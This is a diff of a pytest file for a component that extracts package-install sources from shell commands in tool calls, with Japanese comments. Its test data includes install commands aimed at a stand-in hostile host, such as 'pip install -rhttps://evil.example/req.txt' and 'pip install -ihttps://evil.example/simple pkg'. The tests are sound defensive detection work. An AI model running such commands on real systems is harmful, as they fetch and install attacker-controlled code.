@@ -54,6 +54,19 @@ ACQUISITION_CASES = [
     {"command": "pip install evilpkg # x"},
     {"command": "pip", "args": ["install", "evilpkg"]},
     {"command": "git -C repo status"},
+    {"command": "bash --norc -c 'pip install evilpkg'"},
+    {"command": "bash --rcfile x -c 'pip install evilpkg'"},
+    {"command": "bash -o pipefail -c 'pip install evilpkg'"},
+    {"command": "bash script.sh -c 'pip install evilpkg'"},
+    {"command": "bash -c"},
+    {"command": "pip install -rhttps://evil.example/req.txt"},
+    {"command": "pip install -egit+https://github.com/evil/repo.git"},
+    {"command": "pip install -ihttps://evil.example/simple pkg"},
+    {"command": "pip install -qrhttps://evil.example/req.txt"},
+    {"command": "pip install -qr https://evil.example/req.txt"},
+    {"command": "pnpm --dir repo add foo"},
+    {"command": "pnpm -C repo add foo"},
+    {"command": "pnpm --filter app add foo"},
 ]
 
 _EXPECTED_SOURCES = [
@@ -69,6 +82,29 @@ _EXPECTED_SOURCES = [
     ["crates:ripgrep", "git:github.com/x/y"],
     ["gem:rails"],
     ["npm:create-vite"],
+]
+
+
+# 指摘の例そのもの。実装の該当の行を外すと落ちる。
+_OPTION_SPELLING_CASES = [
+    ("bash --norc -c 'pip install evilpkg'", ["pypi:evilpkg"], False),
+    ("bash --rcfile x -c 'pip install evilpkg'", ["pypi:evilpkg"], False),
+    ("bash -o pipefail -c 'pip install evilpkg'", ["pypi:evilpkg"], False),
+    ("bash -xc 'pip install evilpkg'", ["pypi:evilpkg"], False),
+    ("bash script.sh -c 'pip install evilpkg'", [], False),
+    ("bash -c", [], True),
+    ("pip install -rhttps://evil.example/req.txt", ["url:evil.example/req.txt"], False),
+    ("pip install -egit+https://github.com/evil/repo.git", ["git:github.com/evil/repo"], False),
+    (
+        "pip install -ihttps://evil.example/simple pkg",
+        ["index:pypi:evil.example/simple", "pypi:pkg"],
+        False,
+    ),
+    ("pip install -qrhttps://evil.example/req.txt", ["url:evil.example/req.txt"], False),
+    ("pip install -qr https://evil.example/req.txt", ["url:evil.example/req.txt"], False),
+    ("pnpm --dir repo add foo", ["npm:foo"], False),
+    ("pnpm -C repo add foo", ["npm:foo"], False),
+    ("pnpm --filter app add foo", ["npm:foo"], False),
 ]
 
 
@@ -339,3 +375,37 @@ def test_the_ledger_expires_by_its_clock() -> None:
     assert ledger.classify("b", written) == {}
     now[0] += ec.LEDGER_TTL_SEC + 1
     assert ledger.classify("a", written) == {}
+
+
+@pytest.mark.parametrize(("command", "expected", "cut"), _OPTION_SPELLING_CASES)
+def test_option_spellings_do_not_hide_or_invent_an_install(command, expected, cut) -> None:
+    """長いオプションを -c と取り違えず、短いオプションに付けた値を読み、pnpm の共通の値を飛ばす。"""
+    assert acquisition_sources_with_overflow({"command": command}) == (expected, cut)
+
+
+def test_a_shell_after_a_long_option_reaches_the_event(tmp_path, monkeypatch) -> None:
+    """--norc の後ろの -c の中の導入が、本文を送らない構成の事象に載る。"""
+    Session = _install(monkeypatch)
+    path = tmp_path / "e.jsonl"
+    _register(path, capture_arguments=False)
+    asyncio.run(Session().call_tool("run", {"command": "bash --norc -c 'pip install evilpkg'"}))
+    shutdown()
+    mcp = _events(path)[0]["data"]["mcp"]
+    assert mcp["acquisition_sources"] == ["pypi:evilpkg"]
+    assert "acquisition_sources_truncated" not in mcp
+
+
+def test_content_digests_are_capped_across_strings() -> None:
+    """上限は文字列ごとでなく全体に掛かる。短い文字列を多数並べても保持は上限で止まり、印が立つ。"""
+    cap = ec.MAX_WRITE_DIGESTS
+    # 文字列の数の上限に届かない数の文字列に、それぞれ上限より少ない数の行を入れる。
+    per = 64
+    count = cap // per + 8
+    assert count < ec.MAX_SCANNED_STRINGS
+    texts = [
+        "\n".join(f"string {s:05d} line {i:05d} padded to be long enough" for i in range(per))
+        for s in range(count)
+    ]
+    digests, overflow = ec.content_digests({"items": texts})
+    assert overflow is True
+    assert len(digests) <= 2 * cap
